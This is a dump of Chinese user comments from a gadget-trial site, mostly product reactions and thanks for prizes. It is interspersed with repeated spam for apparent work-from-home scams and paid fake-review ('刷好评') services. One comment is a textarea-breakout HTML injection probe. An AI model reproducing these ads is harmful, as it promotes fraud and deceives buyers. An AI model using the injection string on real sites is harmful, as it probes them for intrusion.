又没中，头疼，下次不来了 
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。=======================================================有意者【加 q ２３６０３７６９０９】 
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。-----------------------有意者【加 q ２３６０３７６９０９】 
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。-============================有意者【加 q ２３６０３７６９０９】 
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。--------------------------有意者【加 q ２３６０３７６９０９】 
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。===============================有意者【加 q ２３６０３７６９０９】 
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。============================有意者【加 q ２３６０３７６９０９】 
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。==================有意者【加 q ２３６０３７６９０９】 
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。===============有意者【加 q ２３６０３７６９０９】 
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。===============有意者【加 q ２３６０３７６９０９】 
会不会好热~直接手表这样不更好
会不会因为手机插孔排放的热量导致温度偏差?
挺不错的~~
期待产品的上市。
应该是一个好产品。
好有创意 期待可以获得 
我很期待。。。。。
我试用看吧。
很期待，先试用看看，好用在同学们这里展示一下
室温有什么好测的？空调都有啦
妈妈再也不用担心我走路玩手机了。
好期待啊，，怎么申请的牙世界团购网好期待啊
可能没那细胞  送我我感觉还是带个手机听方便~~大不了配个好耳机
无创意  ~~~土豪的标志罢了  卖的不是东西 卖的是土豪的证明
不错的选择，如果再加个无线摄像头就更完美了。如果能够再加些传感器就更加完美了。
真怕大马路上变透明了
手机APP秒杀他 
你来啦，非常感谢你的支持呦！不过这东西要写评测报告的，地址也不能改，你可以申请下次的试用呦，说不定就中签了，加油吧！
全玻璃结构？？一摔到不就支离了，破碎了。设计理念到是不错，不够实用。买来ZB还是不错的
这东西到底是做什么用 的
申请使用，感觉像热熔胶一样的吗？就是把胶变成了塑料而已
感觉好像是把塑料融化后加速冷却。。。。
续航能力  ......... 再好的功能    不能启动    一切都是鸭蛋
想起了刀剑神域
很漂亮的说。很喜欢
好东西啊赶快出啊
亲，上传个头像吧，可以更好的展示哦~
等你普及了电站  在搞出个WIFI一样 20米之内就能充电的时候在卖吧  
东西不错，我单车上正好缺一个，就是有点贵啊，单车才2800多块，这个就占了1/4.
我买了一个，用起来还不错，家里一天台式的，插上去，两台笔记本，一台ipad，3部手机，只要没人看电影，速度杠杠的
担心的是打印过程中会不会移位。造成偏差。。
期待下...
不会掉出来吗？
好东西，外观简洁，可惜又是给土豪设计的。
又是给土豪设计的啊
国内有没有卖的？给我侄子买一个
  谢谢宝贵意见评论
好东西，对于不会3D建模的人来说很不错，但是实际效果可能不会太好呢
外观不错，大气简洁，给土豪设计的
电池的问题，另外会不会增加辐射，本来天天对着电脑就吸收很多辐射，这个会不会增加辐射？
阿士大夫撒反对
细一点。。。
价格适中，出来了去看看
呵呵扛着就走 连锁都不用拆了   
怎么不设计成小点儿，隐蔽点的。
确实贵的离谱，不知道这价位跟车的质量不是不是靠谱的？
这个价格比那个什么16000的电动自行车靠谱
汗颜啊······这将会是小三必备神器。
下一批次什么时候 
实际大小是多少？，还有价位呢？这个不用电所以价格应该可以便宜点吧？其实我觉得消毒还是个问题。
创意很不错  适合夫妻之间的情趣~~
感觉跟3D打印还是有点不一样的
有点太抽象化了
有W7  W8   这个的作用就减弱了
发酵产生的甲烷如何处理掉？  具体的问题还是要考虑进去的
人站在上面怎么保持低重心不倒？
给我个试试呗
这个问题应该很好解决
真的好用。
我笔记本 按两下也可以啊
这个算是创意么？
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。有意者【加 q２=３６０３７６９０９】
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。有 意者【加 q２=３６０３７６９０９】
用空余的时间做份网络工作吧。家庭主妇,在校学生,办公室人员咨询。每天也能80-150块。根据自己的时间自由安排。不影响生活工作。多作多结算。有意者【加 q ２=３６０３７６９０９】
很期待的好东西呢 只是不知道实际应用起来如何ww
我想，给我一个个吧
哇塞 好酷
希望可以出酷派的 
赞~~~~~~~~~~
牛，非常期待
期待，太期待了， 
3D打印？？什么原理呢？没搞明白
特别期待，
如果可行在配一个旋转马达之类的就更好！尼玛 人家连袜子都懒得洗难道会用手摇？
功能比较强大？随时了随地了解自己的身体状况！就是不知道数据的准确度怎么样
那这样的产品是否根据无线电波充电呢， 对人体的辐射怎样？辐射对人体的危害大吗
这东西也能叫3D打印笔?  不就是一个加热器能后把溶化的料挤出来吗?
asdfasdfasdfxcZXcasdfasfdasdfasdfasdfxcZXcasdfasfdasdfasdfasdfxcZXcasdfasfdasdfasdfasdfxcZXcasdfasfdasdfasdfasdfxcZXcasdfasfdasdfasdfasdfxcZXcasdfasfdasdfasdfasdfxcZXcasdfasfdasdfasdfasdfxcZXcasdfasfd
还是需要手机app辅助吗？ 还是那些监控数据在手环上显示？
想法还是不错的
小编一定一定一定一定一定要选我呀，我之前没半次中过
今晚女生宿舍就靠它了
如果没有异味，而且不费电，我还是愿意试一下的 
这东西靠谱不？
没啥实用性，我要换个类型的锁，咋办呢？
确实贵，比车更容易被偷
这支笔工作原理是什么呢？只看到笔头有个小心高温。。
这不就是热胶枪吗
我们被监视的还不够吗
强大，期待
什么打印笔啊？ 就是个塑料热熔枪！ 20块一个  大把五金店有卖
好像拥有啊！！ 
有双击吗？有长按、短按之分吗？
给力啊~我都没抢到。。。
就是热胶枪，还t..m3d打印  吹牛
就是缩小版热胶枪啊
什么时候出来才是最实际的
可以测体温的我一定买
看着别扭！！！！！！！！！！！！！111
看起来就像是把热胶枪啊
什么时候可以买啊
二楼接翔啊！
就是热胶枪迷你版
产品很有市场~~不过价格一定要益民~~运动加称重，适合每个人的日常需求~~对于忙碌的现代人来说，这款机器满足在室内运动，且可以边运动边看电视的需求，而且还有附加功能，称重和连接软件，时刻提醒自己要运动~~重点不占空间~~希望赶快出来~~价格决定产品销量！
创意不错~不过价格太高~~实用性不高毕竟很多家庭需要为花施肥~~很难在中国打开销路
奇酷网给奇粉们带来欢乐，付出就有回报。大家要多多支持360及奇酷网！那她的明天会更更加精彩。
创意时，京东有售。并且有网友评论
功能不错，血压应该很难测到~不过有测温度和心理的功能不错~~随身随时了解身体状况~~价格最好在100以内~~
贵了点吧！！！真的好漂亮啊！！！
我一代二代都有了。确实挺好用挺方便的。
这种充电产品是否会影响手机的电池寿命~~在与有线充电器相同效果的情况下，这款产品值得拥有~~希望容量大点~~各种型号手机都可使用~这样出差旅行~~全家能用~~~不需要带那么多的充电器了~~最好连ipad、相机等便携式电子产品都能使用~~
无语了！太强大了！科技真是越来越发达了！这才是真正的高科技！
一直在用，那是相当的霸道啊！！！挺好用挺方便的。大爱360产品，支持360。
测温正确的话是好东西，我要！
我和佛有缘，奇酷和我有缘。奇粉们我们聚在一起也是缘分！
我把佛放在心中把奇酷放在生活中
感觉就像那些。。。拿一条胶的工作原理差不多，加热“墨水”  打开，再迅速冷却。。
热胶枪？？把里面的胶棒换成类似塑料线，加热，挤出，在凝固下来？？？
真期待啊~~~~
把想法化为现实的利器。。。！！！
懒得用手摇
不如买个七彩虹了
如果可以在20-30元（人民币）的售价内就好了
这么牛！？
459元！！贵死了 
快点把这东西山寨出来吧···
三星，good！  
已经开始卖了，还标明创意中！
你是三星的员工？ 
都开始卖了！ 
最后一张图是自黑吗
希望不是忽悠，广告了这么久。希望没有白费功夫 
单车80块的路过......
都开始卖了！
+1 赞一个 ...
我想要！！！！ 
垃圾！！！！！！  
能测体温的最好 
牛逼了点吧！
迷你的运动器材，高科技，看有什么长处没？
太帅了~~~~不得不赞叹科技力量的强大~~~~~~~
太棒了，我喜欢！
接口换成usb3.0；容量太小了，不实用。
用空闲的时间赚钱零花钱 这个可以有.. 收入和付出是成正比的 多劳多得的..我们是有强大的团队 不管你是卖家还是买家都可以加入我们 工资日结 联系YY;844720954或扣2602736304 让你休闲娱乐的同时，轻松挣钱挣钱 期待你的加入...
为什么不能再盖子上加上太阳能电池呢   现在有薄膜太阳能电池  刚好完美搭配  
没事戴个手套好别扭啊
如果能在儿童早期智力开发中运用的话，将大大提高学生的创造力
贵了点，创意很好，真想买一个 
什么破公司，说话就像放屁，去年发布就说14年2月份上市销售，这都4月了，等了半年了，愣是音信全无，浪费感情，买其他公司产品了，做工比这破公司强100倍……垃圾！！
经常玩...不过用的是气保焊枪...做出来的东西都是金属的
太帅了~~~~不得不赞叹科技力量的强大~~~~~~~ 
清洁版360路由器上市后：我家wifi生气跑了。。。。。。
真的很期待哦！
我感觉这个东西很个性的
外形不错   不过价格在学生当中有些贵了  
大赞  求价格
感觉这个还不错
就是有点贵
这个真的很不错
这玩意要是谁拿来***，挡都挡不住
不错，有待考量
这东西肯定不便宜
五连败奖品 感动 
让美女增加对你的好奇，更容易上手..嘻嘻
这个可以有，现在的小孩太幸福了，想想我们小时候，顶多也就骑骑摩托车
你们好  请问怎么和你们联系  我也有一个智能家居的专利 想向你们讨教经验  或者合作开发  我的QQ：824753433  电话：15377554242   姓：圣
进入国内哪价格 唉~~不说了
呵呵 期待万能的淘宝出的300块的山寨单车 淘宝 你懂的~
鼓励一下，很好的创意，是我一直在寻找的。就是价格太贵，等降了点就买。
那块液晶就是蓝牙耳机
@眼镜犬！！！
32g OTG 的 并且有WIFI就好了
很期待。原来天猫上有阿尔卡特的专卖店的，但是现在没有了。不知道为什么。我还以为它倒闭才把天猫店关掉的呢。
关键是收套脏了怎么洗？？
主题曲还是那首荷塘月色吗
这个还用搞创意吗？直接点，就一个貌似豆浆机吧剩菜剩饭打碎然后烘干。
我想这只不过是一个新奇的玩具，不能过分追求精准
创意无限啊，求试用
比直接洗更费时间和劳力。
怎么预约啊？
就是个热熔枪 五金店有的是....
是我车子价格的2倍多
其实就是一个加热器，里面加进ABS材料，插电加热后把它挤出来。
确实如此，只不过热熔枪是早期人们3D打印的东西，现在这个安全性能更好。
我认为这将是儿童手工课的利器，所以我来申请。
为啥只有NOTE3？ 
希望增加蓝牙或者耳麦功能 这样可以提高在嘈杂环境中语言识别能力
贵了，300元以内可以接受！
 无聊的亲们可以来看看，繁忙的润之轩宅家平台需要有空闲时间的亲，来做点闲余差事，每天结工钱的喔，一般五十到一百左右。要求：做事认真，每天至少有两小时～～ 扣：23～603～76～909
 无聊的亲们可以来看看，繁忙的润之轩宅家平台需要有空闲时间的亲，来做点闲余差事，每天结工钱的喔，一般五十到一百左右。要求：做事认真，每天至少有两小时～～ 扣：23～603～76～909
 无聊的亲们可以来看看，繁忙的润之轩宅家平台需要有空闲时间的亲，来做点闲余差事，每天结工钱的喔，一般五十到一百左右。要求：做事认真，每天至少有两小时～～ 扣：23～603～76～909
 无聊的亲们可以来看看，繁忙的润之轩宅家平台需要有空闲时间的亲，来做点闲余差事，每天结工钱的喔，一般五十到一百左右。要求：做事认真，每天至少有两小时～～ 扣：23～603～76～909
 无聊的亲们可以来看看，繁忙的润之轩宅家平台需要有空闲时间的亲，来做点闲余差事，每天结工钱的喔，一般五十到一百左右。要求：做事认真，每天至少有两小时～～ 扣：23～603～76～909
 无聊的亲们可以来看看，繁忙的润之轩宅家平台需要有空闲时间的亲，来做点闲余差事，每天结工钱的喔，一般五十到一百左右。要求：做事认真，每天至少有两小时～～ 扣：23～603～76～909
哎呦，不错的新奇玩意呦
这手套适合装逼，效果比手表好。
终于有奖品了
这玩意是不是配合高潮用的呀？没事谁会把小秘密公布呢？
国外的众筹集资还是很给力啊。
工程版就在用了 现在是二代了支持 
我很需要，一定要给我一个啊
好产品，要被大众接受，希望价位不会太高
很酷的设计，只是15000的价格稍高了些，毕竟对英国人来讲只是1500嘛。
科技改变生活，这话一点没错，但估计价格不菲吧
一直在用，必须支持
烘干是不能沤肥的。
一定要给我
新奇小玩意 申请个
写的一般吧
被选中了，谢谢 试用后给大家分享心得  平台有点bug给奇酷两个小建议：1、看不到自己申请的内容，不太方便；2、刚刚提交评论时，系统提示我说的太快？
科技改变生活，好像要
应该比手洗强吧。不太喜欢手洗衣服。
奇酷，新奇又酷，我想要！
3d打印机本世纪最吊的产品，数货源做销售，希望价格大家都可以接受
好厉害的样子
白送最好是不
皇帝的新装？
这个貌似不错啊，设计很简约，赞一个
设计不错，有创意
感念不错，有点小贵
万一夫妻间它不透明，岂不是呵呵啥都明白了……
车没了锁还在，这个还好，要是车还在，锁没了……
什么时候可以买啊。。。等了N多天了。。。
很感兴趣，想试试
我也想试试，呵呵，立体画。真不错。
钱包那么小，能装几百块钱啊
希望早点出产品吖
如果可以安排自己可以做什么梦，那就神了！
背面简直无法直视
申请一个！
我也想试试，呵呵，立体画。真不错。 
这个好喜欢的，脑子里有好多设想。。。
立体画，貌似不错的样子········
是不是马上就要开始发货试用了啊。
这玩意。。。。好像只适合特殊场合
牛逼啊。。。这是健身洗衣一举两得啊。。力量还可以自己控制
好建议啊。
连续申请五次都不得中奖的看来不是只有我一个啊。
快捷 方便 给力！！！
坚持总是能得到好结果的！虽然我运气不好，连续5期申请奇酷试用都没中。但是我性格好，连续5期都申请感动了奇酷小编，免费赢得了给力奖品。没有坚持到底的小伙伴们羡慕吧！ 
怎么没酷派的~
我已经有个限量版的植物大战僵尸活动发的360wifi2！很感谢再送一个！此致敬意！希望发宝贝速度稍微快些！
骐骥一跃，不能十步；驽马十驾，功在不舍。同样，成功的秘诀不在于一蹴而就，而在于你是否能够持之以恒。       竟然送我小礼品，感觉很激动，面对一直的失败，前方总会有惊喜！只要你还在一直努力做下去！感谢有你，一路相伴
感谢奇酷，终于看到幸运女神降临，今天收到短信，有点疑惑，立马上奇酷，发现有个挂件，一点，呵呵，一个智键，呵呵，感谢啊
从内测开始用……1代二代都有……没想到 这又送一个……继续支持……期待下次能获得其他工程试用品……360太牛X了 这是免费送的节奏啊！！！！！！
谢谢360，得到随身歪歪一枚
等奖品中，感动!
感谢奇酷 为我们准备的小礼物 等待奖品
感谢小编送出的礼品。360智键一枚，哈哈，太喜欢了！小编速度发货啊。继续支持奇酷，支持360！
谢谢奇酷网，真是一个意外的惊喜啊
虽然已经买了。但是还是感谢一下。。期待下次能选中啊！！
什么时候第二波啊，等了N久了。
感谢送出的礼品。360智键一枚，太感谢了！快发货吧我等不急了。继续支持奇酷，支持360！ 
谢谢奇酷，这么多次的坚持总算没白费
先赞一个再说
感谢送出的礼品。360智键一枚，继续支持奇酷，支持360！ 
谢谢您的建议，会加油的，还有后续，马上出来，希望多多关注呦！
还有些遥控器没有拿出来呢。。。哎~~我太败家了。。。。
怎样买的到啊
谢谢奇酷，真是坚持就是胜利！我要一直申请下去
为什么还没后卖的呀，赶紧公布价格，我家两个宝宝都需要的说！
奇酷网太敞亮了！
感谢送出的礼品。360智键一枚！快发货吧我等不急了。继续支持奇酷，支持360！  
虽然连续五期都未被抽中，但总算有个安慰奖，不过我始终都是想要一个儿童卫士，希望下次有机会抽中啦。另外我想问下儿童卫士什么时候可以购买？
太好啦，虽然申请没有通过，但抽奖中了一个360WIFI2代，这个一直想要，，会继续申请，感谢
我被选中 我很开心
特别激动，第一次获奖！！！！感谢360，我会死不悔改的支持下去的！！O(∩_∩)O哈哈~
非常好用的产品，重点是方便，去哪个朋友都不再担心没有网络用了，很棒
非常感谢奇酷网给了我一个五次未中的安慰奖，我很喜欢这些新奇的设计，非常感谢，希望有好运气获得试用资格。
有没有在路由器上加一个震动棒的？？？嘻嘻
宽带猫和路由器结合在一起就好了
谢谢您的肯定!这次是由于时间太紧了加上周1~5要加班星期6天要考试，而且奇酷的这个系统不允许直接复制的图片只能一张一张插图，实在抽不出时间在从新排版插图了。哎时间不够用啊！希望可以理解！
卧槽，手摇洗衣机！
还以为是新型自行车呢 
iPhone 变得更长了...
颜色浅的那一头是 分  颜色深的那一头是 时
好，很好，真的很好
我一直关注儿童卫士，可为什么一直不拿出来卖呢。当然我也很感谢奇酷网给我一个安慰奖，这个小东西虽小但功能大，收到后会写写试用报告。希望下次能有好运获得试用资格。
我一直关注儿童卫士，可为什么一直不拿出来卖呢。当然我也很感谢奇酷网给我一个安慰奖，这个小东西虽小但功能大，收到后会写写试用报告。希望下次能有好运获得试用资格。
如果指针是虚拟的，就更有科技派了。
非常感谢360！
正宗好小编~~~~~~~~
期待早日买到实物。
都半个月了，等的我花儿都谢了》。。。
好久没来了，看看
我们家未来的小画家＝＝＝＝着急呢！
虽然一直没有得到试用的资格，不过这个安慰奖实在是给力呀，希望以后的试用能通过。
漂亮有创意
不错，很有创意 
这个产品是个自虐的产物啊。
有时间的时候可以蹊一下~
哈哈哈，我关心的是洗的干净不
usb3.0比较好
usb2.0太慢了    ，速写速度不够    3.0比较好
低调的很。
相当不错的360随身wifi，方便、快捷，安装最新的驱动后功能强大。
www.smartwallit.com
.....这还真算的上是创意
个人觉得小米很垃圾的啊
我从来没有购买过小米产品的啊
支持360所有的产品哈哈
选我吧选我吧，看在我提交那么完美的一份报告上！！！
嗯，谢谢支持啦！最近有很多新活动和产品呦，以后多多关注吧，赞啦~~
洗不干净不说 把衣服都搅坏了是真的
zhichi支持一下啊
360早就有了啊
我一直关注儿童卫士，可为什么一直不拿出来卖呢。当然我也很感谢奇酷网给我一个安慰奖，收到后会写写试用报告。希望下次能有好运获得试用资格。  
选我吧，刚好想设计东西。。。 
非常感谢奇酷网给了我一个五次未中的安慰奖，我很喜欢这些新奇的设计，非常感谢，希望有好运气获得试用资格。
时针可以透明点 
360除了很新产品啊
这个什么时候能购买呢？等很久了，快没路由用了！
高科技情趣内衣
选我吧      我要买三十个
很感谢奇酷网的安慰奖，支持！
因为我抛弃了小米，所以我选择了360
事实上手机内部已经有4个温度传感器，分别用于采集电池、处理器等部件的温度，并及时降频甚至关机，防止过热损害硬件和危及使用者的安全。由此可见手机各部分发热导致的误差无法被忽略，所以这个设备将很准确测温。
额！高科技啊啊啊 大家关注微信公众平台平台：wndgzpt！！
 大家关注微信公众平台平台：wndgzpt！
看着感觉故障率应该好高
最好再增加指北针，表盘还是有点单调
脚动洗衣机，挺有创意，既锻炼身体又洁净卫生，不知洗衣效果如何，期待中
还没收到，期待中…………
我还没收到呢！
怎么还没有出售啊？？？ ？都等不及了
很不错啊！思路很宽泛，值得学习！
高富帅的菜
外形看起来不错哦~
好喜欢，太酷了！
什么时候上市啊 
浪费名额啊。。。。
还好吧。。。只是在普通踩步机上加了些计算的东西
亮点是什么
这个。。。理论上可以打印出所有实体物，这个应该没问题，但是打印材料呢亲，我想打印一件衣服，现在已经可以了。我要一辆自行车呢？！how？真的热熔金属？！工业级的要破百万，你这得多少软妹子啊？！
优柔寡断,是人生最大的负能量。人生没什么好优柔的。从生命角度去看,无论您怎么选,都有偏差；因此,当选择来临,A和B,拿一个便走就是。人生没有对错,只有选择后的坚持,不后悔,走下去，就是对的。独立商城刷好评打造爆款，淘宝店铺刷评价打造爆款，独立商城刷好评提升、刷独立商城刷单量、天猫店铺刷业绩额、亚马逊宣传、博客广告投放。QQ:800027800、网址＞www.tbcase.com
上次的360智能键没抽到！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
优柔寡断,是人生最大的负能量。人生没什么好优柔的。从生命角度去看,无论您怎么选,都有偏差；因此,当选择来临,A和B,拿一个便走就是。人生没有对错,只有选择后的坚持,不后悔,走下去，就是对的。独立商城刷好评打造爆款，淘宝店铺刷评价打造爆款，独立商城刷好评提升、刷独立商城刷单量、天猫店铺刷业绩额、亚马逊宣传、博客广告投放。QQ:800027800、网址＞www.tbcase.com
优柔寡断,是人生最大的负能量。人生没什么好优柔的。从生命角度去看,无论您怎么选,都有偏差；因此,当选择来临,A和B,拿一个便走就是。人生没有对错,只有选择后的坚持,不后悔,走下去，就是对的。独立商城刷好评打造爆款，淘宝店铺刷评价打造爆款，独立商城刷好评提升、刷独立商城刷单量、天猫店铺刷业绩额、亚马逊宣传、博客广告投放。QQ:800027800、网址＞www.tbcase.com
快递好快呀！！！从哪里发出来的货呢，楼主是哪里的呀？
优柔寡断,是人生最大的负能量。人生没什么好优柔的。从生命角度去看,无论您怎么选,都有偏差；因此,当选择来临,A和B,拿一个便走就是。人生没有对错,只有选择后的坚持,不后悔,走下去，就是对的。独立商城刷好评打造爆款，淘宝店铺刷评价打造爆款，独立商城刷好评提升、刷独立商城刷单量、天猫店铺刷业绩额、亚马逊宣传、博客广告投放。QQ:800027800、网址＞www.tbcase.com
优柔寡断,是人生最大的负能量。人生没什么好优柔的。从生命角度去看,无论您怎么选,都有偏差；因此,当选择来临,A和B,拿一个便走就是。人生没有对错,只有选择后的坚持,不后悔,走下去，就是对的。独立商城刷好评打造爆款，淘宝店铺刷评价打造爆款，独立商城刷好评提升、刷独立商城刷单量、天猫店铺刷业绩额、亚马逊宣传、博客广告投放。QQ:800027800、网址＞www.tbcase.com
优柔寡断,是人生最大的负能量。人生没什么好优柔的。从生命角度去看,无论您怎么选,都有偏差；因此,当选择来临,A和B,拿一个便走就是。人生没有对错,只有选择后的坚持,不后悔,走下去，就是对的。独立商城刷好评打造爆款，淘宝店铺刷评价打造爆款，独立商城刷好评提升、刷独立商城刷单量、天猫店铺刷业绩额、亚马逊宣传、博客广告投放。QQ:800027800、网址＞www.tbcase.com
优柔寡断,是人生最大的负能量。人生没什么好优柔的。从生命角度去看,无论您怎么选,都有偏差；因此,当选择来临,A和B,拿一个便走就是。人生没有对错,只有选择后的坚持,不后悔,走下去，就是对的。独立商城刷好评打造爆款，淘宝店铺刷评价打造爆款，独立商城刷好评提升、刷独立商城刷单量、天猫店铺刷业绩额、亚马逊宣传、博客广告投放。QQ:800027800、网址＞www.tbcase.com
优柔寡断,是人生最大的负能量。人生没什么好优柔的。从生命角度去看,无论您怎么选,都有偏差；因此,当选择来临,A和B,拿一个便走就是。人生没有对错,只有选择后的坚持,不后悔,走下去，就是对的。独立商城刷好评打造爆款，淘宝店铺刷评价打造爆款，独立商城刷好评提升、刷独立商城刷单量、天猫店铺刷业绩额、亚马逊宣传、博客广告投放。QQ:800027800、网址＞www.tbcase.com
价格应该再150左右
看着不错，但是小偷不是傻子，这个安全性值得入手思考
普通自行车 1000多， 这玩意700多，人民群众不太容易接受！
请大家关注一下微信工总平台：wndgzpt
请大家关注一下微信工总平台：wndgzpt
用这个东西之前要不要手机先进行ROOT呢？ 
谁要手机流量？？
谁要手机流量？？
谁要手机流量？？
谁要手机流量？？
请关注微信公众平台：wndgzpt!
请关注微信公众平台：wndgzpt!
总体来说外观太过沉闷 缺乏亮点！  创新技术到位！ 使用起来得熟悉！值得拥有
如果是150一下就果断买一个。
内裤爆款特价：http://detail.1688.com/offer/38364779137.html  阿里巴巴服饰批发！
估计120左右吧
150肯定能买到，估计在120左右
要增加测量体温功能
图片估计是奇酷网本身需要加强的一个地方 传图片真的很慢很蛋疼，如果实在不行 就每个用户名下可以做类似qq相册一样的相册，好像小米论坛就这么处理的。到时候调用自己相册里的图片就行了。
100最好！哈哈
貌似很酷的感觉，求抽到！
还以为是360在开发。。。
100肯定买 
200RMB我还可以考虑一下
除了一组led灯和一个磁铁也没什么高科技东西.估计过段时间淘宝30就能买到
都等不及了   什么时候能购买呢？
要是哪天忘记带戒指了，是不是要把手机砸了？
买这个就是为了校验天气预报是否正确？
喜欢，超级喜欢。
很好很情趣
wp手机可以用吗
更多酷产品尽在：http://www.kooke.org/kchanpin/
相当的高端、大气、上档次。超级喜欢，我一定要努力申请内测资格，大爱啊
很感谢奇酷网的安慰奖，支持！ 还没收到，期待中…………  
本来车不会被偷的，装了这个东西，贼就要考虑下了。
按时大苏打 
我喜欢三星的产品
请问能支持打开wifi开关吗
同问，为什么一定要iphone呢，无语中。
实物其实挺小的
没中· 可惜 
不错的东西 值得体验
拜托 拜托  求抽到
对于孩子或者是老人比较管用
一直期待中
&lt;/textarea&gt;&lt;x&gt;
看着很不错啊
创意很棒，首先解决进水排水的问题，不然只能摆在厕所里
asdasdsa
asddsadasd
飞返设计的表针，屏幕又独立出来，很有设计感
外观确实还有待加强
价格偏高，对中国人浪费粮食的习惯确实很有帮助
这个够累的。手摇。。。洗袜子神器
感觉是科幻，三星的柔性屏幕要是现在能做到这个程度，何必做手套呢。。。
能不用充电就好了
当时自己有机会做的，但没做，悔！
插***儿里就能量体温了
真不如那种做成手机套的款式。。哪有创意？
确实很有创意
玩具车加了个平板，然后方向盘可以当游戏方向盘，真有创意。。。
关注一年多了，不知道什么时候2代能在国内上市
视觉体验不一样，Googleglass是随身带个小电视，可以随时抬眼看信息，这个是完全浸入式的体验，类似玩那种大型环形模拟器
1代戴久了头晕，2代据说不会
确实，装逼可以，不实用
你说的是3D打印机，这个就是自己随心所以的画，哪个更傻瓜？
感觉略厚。其他还好。
好性感啊啊啊 
看起来似乎不错啊。。。。
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
希望有幸能买到吧，再给两个建议 1、增加16G/32G版的 2、改成USB3.0接口
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
期待中。。。
拜托 拜托 求别抽到 
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
期待中。。。
期待中。。。
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
期待中。。。
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
只能做抽象的东西，不能做想茶杯等其他东西吗？
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
 GG和MM们，打开电脑觉得无聊么？别虚度时光了呗，做一份小小的工作一天赚个几十元钱呗，一个月也有1000的小收入哦！想了解的看名字加qq348406022了解一下适合你再来
感觉360安慰安慰我那老是不中的受伤心灵，继续支持！！希望下几次能抽中试用，要是能进测试组就更开心，一定认真对东西进行评测滴，再次感谢，顶!!
